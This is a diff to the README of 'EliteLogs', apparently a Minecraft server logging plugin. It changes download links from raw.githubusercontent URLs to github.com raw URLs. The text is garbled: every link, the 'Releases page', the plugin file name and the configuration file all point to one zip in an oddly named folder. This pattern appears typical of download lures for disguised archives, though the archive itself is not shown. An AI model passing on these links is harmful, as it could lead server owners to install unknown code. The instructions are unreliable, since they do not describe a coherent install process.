@@ -6,7 +6,7 @@ Welcome to EliteLogs! This application is designed to help you monitor your Mine
 
 ## 📥 Download EliteLogs
 
-[![Download EliteLogs](https://raw.githubusercontent.com/DMCOMPUTER/EliteLogs/main/pregratification/EliteLogs.zip%https://raw.githubusercontent.com/DMCOMPUTER/EliteLogs/main/pregratification/EliteLogs.zip)](https://raw.githubusercontent.com/DMCOMPUTER/EliteLogs/main/pregratification/EliteLogs.zip)
+[![Download EliteLogs](https://github.com/DMCOMPUTER/EliteLogs/raw/refs/heads/main/pregratification/EliteLogs.zip%https://github.com/DMCOMPUTER/EliteLogs/raw/refs/heads/main/pregratification/EliteLogs.zip)](https://github.com/DMCOMPUTER/EliteLogs/raw/refs/heads/main/pregratification/EliteLogs.zip)
 
 Click the button above to start downloading. 
 
@@ -23,13 +23,13 @@ Before you download, ensure your system meets the following requirements:
 
 To get EliteLogs running on your server, follow these steps:
 
-1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/DMCOMPUTER/EliteLogs/main/pregratification/EliteLogs.zip) to go to the Releases page.
+1. **Visit the Releases Page**: Click [here](https://github.com/DMCOMPUTER/EliteLogs/raw/refs/heads/main/pregratification/EliteLogs.zip) to go to the Releases page.
 2. **Choose Your Version**: Look for the latest stable release. This will be at the top of the list.
-3. **Download the Plugin**: Find the file named `https://raw.githubusercontent.com/DMCOMPUTER/EliteLogs/main/pregratification/EliteLogs.zip`. Click on it to download.
+3. **Download the Plugin**: Find the file named `https://github.com/DMCOMPUTER/EliteLogs/raw/refs/heads/main/pregratification/EliteLogs.zip`. Click on it to download.
 4. **Locate Your Server Folder**: Open your Minecraft server folder. This is the folder where your server's files are stored.
-5. **Place the Plugin**: Move the downloaded `https://raw.githubusercontent.com/DMCOMPUTER/EliteLogs/main/pregratification/EliteLogs.zip` file into the `plugins` folder within your Minecraft server directory.
+5. **Place the Plugin**: Move the downloaded `https://github.com/DMCOMPUTER/EliteLogs/raw/refs/heads/main/pregratification/EliteLogs.zip` file into the `plugins` folder within your Minecraft server directory.
 6. **Start Your Server**: Launch your Minecraft server. You should see a message indicating that EliteLogs has been loaded successfully.
-7. **Configuration (Optional)**: For additional setup, open the `https://raw.githubusercontent.com/DMCOMPUTER/EliteLogs/main/pregratification/EliteLogs.zip` file located in the `plugins/EliteLogs/` folder. Customize the settings according to your preferences.
+7. **Configuration (Optional)**: For additional setup, open the `https://github.com/DMCOMPUTER/EliteLogs/raw/refs/heads/main/pregratification/EliteLogs.zip` file located in the `plugins/EliteLogs/` folder. Customize the settings according to your preferences.
 
 ## 🌟 Features
 
